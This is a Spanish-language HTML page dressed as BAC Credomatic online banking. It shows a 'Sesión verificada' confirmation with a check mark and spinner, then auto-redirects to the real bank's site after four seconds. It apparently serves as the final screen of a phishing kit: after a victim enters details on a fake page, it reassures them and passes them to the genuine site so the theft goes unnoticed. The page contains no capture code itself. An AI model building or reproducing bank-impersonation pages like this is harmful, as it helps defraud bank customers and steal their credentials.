<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>BAC — Sesión Verificada</title>
  <link rel="icon" href="img/logo_bac.svg" type="image/svg+xml"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;padding:20px;text-align:center}
    img.logo{height:60px;margin-bottom:8px}
    .check{width:80px;height:80px;border-radius:50%;background:#e6f7ec;display:flex;align-items:center;justify-content:center;color:#16a34a}
    .check svg{width:44px;height:44px}
    h1{font-size:22px;color:#111;font-weight:700}
    p{font-size:15px;color:#4b5563;max-width:340px;line-height:1.55}
    .spinner{margin-top:6px;width:36px;height:36px;border:4px solid #e5e7eb;border-top-color:#0067b1;border-radius:50%;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
  <meta http-equiv="refresh" content="4;url=https://www.baccredomatic.com"/>
</head>
<body>
  <img src="img/logo_bac.svg" class="logo" alt="BAC"/>
  <div class="check">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
      <path d="M20 6L9 17l-5-5"/>
    </svg>
  </div>
  <h1>Sesión verificada</h1>
  <p>Estamos redirigiéndote a tu banca en línea. Por favor espera un momento...</p>
  <div class="spinner"></div>
</body>
</html>
